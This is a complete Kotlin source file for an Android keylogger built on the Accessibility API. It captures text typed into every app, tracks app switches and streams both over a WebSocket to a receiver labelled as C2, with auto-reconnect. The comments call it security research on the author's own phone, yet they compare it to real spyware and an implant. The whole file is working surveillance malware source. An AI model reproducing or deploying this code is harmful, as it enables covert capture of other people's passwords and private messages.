package com.security.research.phonemonitor

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * KeyloggerService.kt — Android Accessibility Keylogger
 * ======================================================
 * Captures text input events from ALL apps and sends them
 * to the laptop receiver over WebSocket (WiFi).
 *
 * How it works:
 *   Android Accessibility API fires onAccessibilityEvent()
 *   for every UI change in every app — including text field
 *   changes. We filter for TYPE_VIEW_TEXT_CHANGED events
 *   and forward them with the package name to the receiver.
 *
 * This is how real spyware works. We run it only on our own
 * phone for security research.
 */
class KeyloggerService : AccessibilityService() {

    companion object {
        private const val TAG       = "PhoneMonitor"
        private const val C2_HOST   = "127.0.0.1"   // your laptop IP
        private const val C2_PORT   = 9999
        private const val C2_URL    = "ws://$C2_HOST:$C2_PORT"
        private const val RECONNECT_DELAY = 3000L        // ms
    }

    private var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)   // no timeout for WebSocket
        .build()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isConnected = false
    private var lastText = ""         // debounce — don't send same text twice
    private var lastPackage = ""

    // ── Lifecycle ──────────────────────────────────────────────────────────

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility service connected")

        // Configure which events we want
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_FOCUSED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags        = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                           AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100   // ms between events
        }
        serviceInfo = info

        connectToReceiver()
    }

    override fun onDestroy() {
        super.onDestroy()
        webSocket?.close(1000, "Service destroyed")
        scope.cancel()
        client.dispatcher.executorService.shutdown()
    }

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted")
    }

    // ── Core event handler ─────────────────────────────────────────────────

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg  = event.packageName?.toString() ?: return
        val type = event.eventType

        // Skip our own app and system UI noise
        if (pkg == packageName) return
        if (pkg == "com.android.systemui") return

        when (type) {

            // Text was typed or changed in any field
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.joinToString("").trim()
                if (text.isEmpty()) return
                if (text == lastText && pkg == lastPackage) return  // debounce

                lastText    = text
                lastPackage = pkg

                Log.d(TAG, "[$pkg] text: $text")
                sendEvent(pkg, text, "text_changed")
            }

            // User focused a new window — track app switches
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (pkg != lastPackage) {
                    lastPackage = pkg
                    lastText    = ""
                    sendEvent(pkg, "", "app_switch")
                }
            }
        }
    }

    // ── WebSocket ──────────────────────────────────────────────────────────

    private fun connectToReceiver() {
        val request = Request.Builder().url(C2_URL).build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(ws: WebSocket, response: Response) {
                isConnected = true
                Log.d(TAG, "Connected to receiver at $C2_URL")
                // Send hello packet
                sendRaw(JSONObject().apply {
                    put("event",   "connected")
                    put("package", packageName)
                    put("text",    "PhoneMonitor connected")
                    put("device",  android.os.Build.MODEL)
                    put("android", android.os.Build.VERSION.RELEASE)
                }.toString())
            }

            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                isConnected = false
                Log.d(TAG, "Connection failed: ${t.message}. Retrying in 3s...")
                // Auto-reconnect
                scope.launch {
                    delay(RECONNECT_DELAY)
                    connectToReceiver()
                }
            }

            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                isConnected = false
                Log.d(TAG, "Connection closed: $reason. Retrying in 3s...")
                scope.launch {
                    delay(RECONNECT_DELAY)
                    connectToReceiver()
                }
            }
        })
    }

    private fun sendEvent(pkg: String, text: String, eventType: String) {
        val payload = JSONObject().apply {
            put("event",   eventType)
            put("package", pkg)
            put("text",    text)
            put("ts",      System.currentTimeMillis())
        }
        sendRaw(payload.toString())
    }

    private fun sendRaw(json: String) {
        if (isConnected) {
            webSocket?.send(json)
        }
        // If not connected, events are dropped — in a real implant
        // you'd queue them and flush when reconnected
    }
}
